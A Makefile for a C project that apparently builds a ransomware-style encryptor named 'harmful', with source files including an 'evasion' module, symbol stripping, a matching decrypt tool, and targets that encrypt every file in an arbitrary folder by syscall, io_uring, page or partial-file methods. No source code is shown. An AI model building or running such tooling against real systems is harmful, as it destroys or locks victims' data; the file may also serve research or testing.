CC := gcc

UNAME_M := $(shell uname -m)
STRIP := strip

CFLAGS := -Wall -Wextra -O2 -pthread
CFLAGS_DEBUG := -Wall -Wextra -g -O0 -pthread
LDFLAGS = -lssl -lcrypto -pthread

ifdef USE_IOURING
    CFLAGS += -DUSE_IO_URING
    LDFLAGS += -luring
endif


SRCDIR := src
TOOLSDIR := tools
BUILDDIR := build
TESTDIR := test

MAIN_SOURCES := $(SRCDIR)/main.c \
                $(SRCDIR)/encryption.c \
                $(SRCDIR)/evasion.c

DECRYPT_SOURCES := $(TOOLSDIR)/decrypt_tool.c
TESTGEN_SOURCES := $(TOOLSDIR)/test_generator.c

TARGET := harmful
DECRYPT_TOOL := decrypt_tool
TEST_GENERATOR := test_generator

TARGET_BIN := $(BUILDDIR)/$(TARGET)
DECRYPT_BIN := $(BUILDDIR)/$(DECRYPT_TOOL)
TESTGEN_BIN := $(BUILDDIR)/$(TEST_GENERATOR)

THREADS := 8
TEST_FOLDER := test_files

# Check for io_uring support
HAS_URING := $(shell pkg-config --exists liburing && echo yes || echo no)
ifeq ($(HAS_URING),yes)
    CFLAGS += -DUSE_IO_URING $(shell pkg-config --cflags liburing)
    LDFLAGS += $(shell pkg-config --libs liburing)
    $(info ✓ io_uring support detected and enabled)
else
    $(warning ⚠ io_uring not found - building without io_uring support)
endif

# Colors for output
BLUE := \033[0;34m
GREEN := \033[0;32m
YELLOW := \033[1;33m
NC := \033[0m

#━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Primary Targets
#━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

.DEFAULT_GOAL := all

all: $(TARGET_BIN) $(DECRYPT_BIN) $(TESTGEN_BIN)
	@echo "$(GREEN)✓ All binaries built successfully$(NC)"

# Build main target
$(TARGET_BIN): $(MAIN_SOURCES) | $(BUILDDIR)
	@echo "$(BLUE)Building $(TARGET)...$(NC)"
	$(CC) $(CFLAGS) -o $@ $(MAIN_SOURCES) $(LDFLAGS)
	$(STRIP) $@
	@echo "$(GREEN)✓ $(TARGET) built and stripped$(NC)"

# Build decryption tool
$(DECRYPT_BIN): $(DECRYPT_SOURCES) | $(BUILDDIR)
	@echo "$(BLUE)Building $(DECRYPT_TOOL)...$(NC)"
	$(CC) $(CFLAGS) -o $@ $(DECRYPT_SOURCES) $(LDFLAGS)
	$(STRIP) $@
	@echo "$(GREEN)✓ $(DECRYPT_TOOL) built and stripped$(NC)"

# Build test generator
$(TESTGEN_BIN): $(TESTGEN_SOURCES) | $(BUILDDIR)
	@echo "$(BLUE)Building $(TEST_GENERATOR)...$(NC)"
	$(CC) $(CFLAGS) -o $@ $(TESTGEN_SOURCES) $(LDFLAGS)
	$(STRIP) $@
	@echo "$(GREEN)✓ $(TEST_GENERATOR) built and stripped$(NC)"

# Create build directory
$(BUILDDIR):
	@mkdir -p $(BUILDDIR)
	@echo "$(GREEN)✓ Build directory created$(NC)"

#━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Debug Builds
#━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

debug: $(BUILDDIR)
	@echo "$(BLUE)Building debug version...$(NC)"
	$(CC) $(CFLAGS_DEBUG) -o $(BUILDDIR)/$(TARGET)_debug $(MAIN_SOURCES) $(LDFLAGS)
	@echo "$(GREEN)✓ Debug binary built (unstripped)$(NC)"

#━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Testing Targets
#━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Setup test environment
test-setup: $(TESTGEN_BIN)
	@echo "$(BLUE)Setting up test environment...$(NC)"
	$(TESTGEN_BIN) $(TEST_FOLDER)
	@echo "$(GREEN)✓ Test environment ready$(NC)"

# Run full unit test suite
test: all
	@echo "$(BLUE)Running full test suite...$(NC)"
	@chmod +x $(TESTDIR)/unit_test.sh
	@$(TESTDIR)/unit_test.sh
	@echo "$(GREEN)✓ Test suite complete$(NC)"

# Encrypt test files (safer version)
encrypt-test: $(TARGET_BIN) test-setup
	@echo "$(YELLOW)⚠ WARNING: This will encrypt test files!$(NC)"
	@echo "Press Ctrl+C within 5 seconds to cancel..."
	@sleep 5
	$(TARGET_BIN) -m 1 -t $(THREADS) $(TEST_FOLDER)
	@echo "$(GREEN)✓ Test encryption complete$(NC)"
	@echo "Run 'make decrypt-test' to restore files"

# Decrypt test files
decrypt-test: $(DECRYPT_BIN)
	@echo "$(BLUE)Decrypting test files...$(NC)"
	$(DECRYPT_BIN) ./$(TEST_FOLDER) 1
	@echo "$(GREEN)✓ Test files decrypted$(NC)"

# Clean test artifacts only
clean-test:
	@echo "$(BLUE)Cleaning test files...$(NC)"
	@rm -rf $(TEST_FOLDER)
	@echo "$(GREEN)✓ Test files cleaned$(NC)"

#━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Production Targets (Require Parameters)
#━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Encrypt arbitrary folder
encrypt: $(TARGET_BIN)
	@if [ -z "$(METHOD)" ] || [ -z "$(INPUT)" ]; then \
		echo "$(YELLOW)Usage: make encrypt METHOD=1/2/3/4 INPUT=<folder> [THREADS=2]$(NC)"; \
		echo ""; \
		echo "Available encryption methods:"; \
		echo "  1 - Direct SysCall encryption"; \
		echo "  2 - io_uring encryption"; \
		echo "  3 - Page encryption"; \
		echo "  4 - partial file encryption"; \
		exit 1; \
	fi
	@if [ ! -d "$(INPUT)" ]; then \
		echo "$(YELLOW)⚠ ERROR: Directory '$(INPUT)' does not exist$(NC)"; \
		exit 1; \
	fi
	@echo "$(YELLOW)⚠ WARNING: This will encrypt all files in $(INPUT)!$(NC)"
	@echo "Method: $(METHOD) | Threads: $(THREADS)"
	@echo "Press Ctrl+C within 5 seconds to cancel..."
	@sleep 5
	$(TARGET_BIN) -m $(METHOD) -t $(THREADS) $(INPUT)
	@echo "$(GREEN)✓ Encryption complete$(NC)"
	@echo "Run 'make decrypt METHOD=$(METHOD) INPUT=$(INPUT)' to restore files"

# Decrypt arbitrary folder
decrypt: $(DECRYPT_BIN)
	@if [ -z "$(METHOD)" ] || [ -z "$(INPUT)" ]; then \
		echo "$(YELLOW)Usage: make decrypt METHOD=1/2/3/4 INPUT=<folder>$(NC)"; \
		exit 1; \
	fi
	@if [ ! -d "$(INPUT)" ]; then \
		echo "$(YELLOW)⚠ ERROR: Directory '$(INPUT)' does not exist$(NC)"; \
		exit 1; \
	fi
	@echo "$(BLUE)Decrypting $(INPUT) with method $(METHOD)...$(NC)"
	$(DECRYPT_BIN) ./$(INPUT) $(METHOD)
	@echo "$(GREEN)✓ Decryption complete$(NC)"


#━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Cleanup Targets
#━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Clean all build artifacts
clean:
	@echo "$(BLUE)Cleaning build artifacts...$(NC)"
	@rm -rf $(BUILDDIR)
	@rm -rf $(TEST_FOLDER)
	@rm -f *.log *.core core.*
	@echo "$(GREEN)✓ Clean complete$(NC)"


#━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Phony Targets
#━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

.PHONY: all debug clean \
        test-setup test encrypt-test decrypt-test clean-test \
        encrypt decrypt
